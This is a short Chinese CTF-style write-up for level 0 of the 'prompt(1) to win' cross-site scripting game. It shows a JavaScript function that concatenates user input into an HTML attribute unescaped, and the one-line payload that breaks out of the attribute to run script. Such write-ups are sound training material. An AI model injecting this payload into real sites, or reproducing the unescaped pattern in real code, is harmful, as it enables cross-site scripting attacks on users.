## [[prompt(1) to win](http://prompt.ml)] [[Level 0 - warm up](http://prompt.ml/0)] [[解题报告](http://exp-blog.com/2019/03/18/pid-3613/)]

------

## 题目

```javascript
function escape(input) {
    // warm up
    // script should be executed without user interaction
    return '<input type="text" value="' + input + '">';
}
```

------

## 解题报告

水题。直接闭合双引号和标签即可注入。

payload : `"><script>prompt(1)</script>`

![](http://exp-blog.com/wp-content/uploads/2019/03/ce464cfe08916a3488b01d603044f324.png)

------

## 版权声明

　[![Copyright (C) 2016-2019 By EXP](https://img.shields.io/badge/Copyright%20(C)-2016~2019%20By%20EXP-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
